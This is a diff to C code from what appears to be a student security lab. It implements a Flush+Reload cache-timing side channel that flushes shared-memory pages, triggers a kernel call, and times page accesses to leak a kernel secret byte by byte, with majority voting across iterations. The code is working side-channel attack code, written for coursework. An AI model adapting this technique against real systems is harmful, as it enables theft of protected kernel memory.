@@ -12,6 +12,8 @@
 #include "lab2.h"
 #include "lab2ipc.h"
 
+#define ITERS 1
+
 /*
  * call_kernel_part1
  * Performs the COMMAND_PART1 call in the kernel
@@ -52,22 +54,59 @@ int run_attacker(int kernel_fd, char *shared_memory) {
         // Find the value of leaked_byte for offset "current_offset"
         // leaked_byte = ??
 
-		for (int block = 0; block < 256; block++){
-			clflush(shared_memory + 4096*block);
+		char leaked_byte_arr[ITERS];
+
+		int iters = 0;
+		for (; iters < ITERS; ){
+
+			//Flush all 256 pages from memory
+			for (int block = 0; block < 256; block++){
+				clflush(shared_memory + 4096*block);
+			}
+
+			//Call kernel access
+			call_kernel_part1(kernel_fd, shared_memory, current_offset);
+
+			//Check access time for each block
+			for (int block = 0; block < 256; block++){
+				int time_req = 0;
+				time_req = time_access(shared_memory + 4096*block);
+				if (time_req < 200){
+					printf("Access time for block %c is %d\n", (char)block, time_req);
+					leaked_byte_arr[iters] = (char)block;
+					iters++;
+				}
+			}
 		}
 
-		call_kernel_part1(kernel_fd, shared_memory, current_offset);
+		printf("Data in all iterations: %s\n", leaked_byte_arr);
 
-		for (int block = 0; block < 256; block++){
-			int time_req = 0;
-			time_req = time_access(shared_memory + 4096*block);
-			if (time_req < 200) leaked_byte = (char)block;
+		int* count = (int *)malloc(128 * sizeof(int));
+		for (int i=0; i<128; i++){
+			count[i] = 0;
 		}
 
-        leaked_str[current_offset] = leaked_byte;
-        if (leaked_byte == '\x00') {
-            break;
-        }
+		for (int i=0; i < ITERS && leaked_byte_arr[i] != '\0'; i++){
+			count[(int)leaked_byte_arr[i]]++;
+		}
+		
+		int max_val = 0;
+		char max_char = '\x00';
+
+		for (int i=0; i<128; i++){
+			if (count[i] > max_val){
+				max_val = count[i];
+				max_char = (char)i;
+			}
+		}
+		printf("Max char: %c\n", max_char);
+
+		leaked_byte = max_char;
+		//Concatenate bytes to form leaked string
+		leaked_str[current_offset] = leaked_byte;
+		if (leaked_byte == '\x00') {
+			break;
+		}
     }
 
     printf("\n\n[Lab 2 Part 1] We leaked:\n%s\n", leaked_str);
